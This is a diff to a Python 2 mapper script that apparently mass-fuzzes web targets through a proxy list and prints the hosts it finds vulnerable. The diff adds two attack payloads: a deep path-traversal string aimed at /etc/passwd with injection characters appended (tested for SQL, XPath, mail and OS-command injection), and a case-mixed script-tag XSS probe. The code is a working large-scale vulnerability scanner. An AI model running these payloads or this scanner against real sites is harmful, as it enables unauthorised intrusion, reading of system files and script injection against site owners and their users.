@@ -27,9 +27,19 @@ def get_proxy_list():
 
     return proxies_list
 
+def fuzz_and_print_results(gf):
+
+    for r in gf.fuzz():
+
+        try:
+            if True in r.result_dic.values():
+                print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)
+        except:
+            sys.stderr.write("Failed to fuzz a target!\n")
+
 def mapper():
 
-    simul_fuzz = 1000
+    simul_fuzz = 100
     proxy_list = get_proxy_list()
     c = 0
     gf = GetFuzzer(num_threads = 40, proxy_list = proxy_list)
@@ -48,16 +58,16 @@ def mapper():
             sys.stderr.write("Failed to add line to targets!\n")
 
         if c == simul_fuzz:
-            for r in gf.fuzz():
-
-                try:
-                    if True in r.result_dic.values():
-                        print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)
-                except:
-                    sys.stderr.write("Failed to fuzz a target!\n")
-
+            fuzz_and_print_results(gf)
+            gf = GetFuzzer(num_threads = 40, targets = [], payloads = [], proxy_list = proxy_list)
             gf.targets = []
+            gf.payloads = []
+            gf.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
+            gf.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
             c = 0
+
+    if c > 0:
+        fuzz_and_print_results(gf)
 
 if __name__ == "__main__":
 
